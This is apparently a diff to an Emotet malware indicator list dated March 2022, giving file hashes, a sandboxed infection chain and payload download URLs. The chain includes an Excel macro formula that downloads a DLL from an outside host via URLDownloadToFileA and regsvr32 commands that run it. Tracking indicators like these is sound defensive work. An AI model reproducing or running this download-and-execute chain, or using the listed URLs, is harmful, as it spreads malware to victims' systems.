@@ -2,8 +2,23 @@ Emotet 2022 | epoch4 | 25.03.2022 |
 
 ************************************************************************************************************
 
-.xls e1c41059745f8362c945dc9254343f21c1da8766b021911ea04db73f27c2377e
-.dll 39d425554771aae1fb1d5cd92f4862e1bbd6c09346477f8fe73caaf6514918e5
+.zip 86035297056fb70888889e8934993fd8614b23346b20894569eb2a6d88267fc9
+.xls 0f5489490d024359de7ae807cb25534096e1350a8eb1ebc25e48d8055d5b83c5
+.dll e188f1fcd58cbd57a3a7a15cb1c3d8ae83bcb2070d421e92939833e087e053d0
+
+************************************************************************************************************
+
+EXCEL.EXE C:\Users\Admin\AppData\Local\Temp\Electronic form.xls
+
+=CALL("urlmon", "URLDownloadToFileA", "JCCB", 0, "http://clipacc.com/img/doXw68d7bqxxhwuxNb0N/", "..\axwn.dll")
+
+C:\Windows\SysWow64\regsvr32.exe -s ..\axwn.dll
+
+C:\Windows\SysWOW64\regsvr32.exe
+
+C:\Windows\SysWOW64\regsvr32.exe /s C:\Windows\SysWOW64\Psmpkuths\ykwfjd.ckh
+
+************************************************************************************************************
 
 https://cliniquepourenfants.com/css/VHvHW6TUoN/
 http://clovisclark.com/cristina/oHhyKOoFQilsF2EljI/
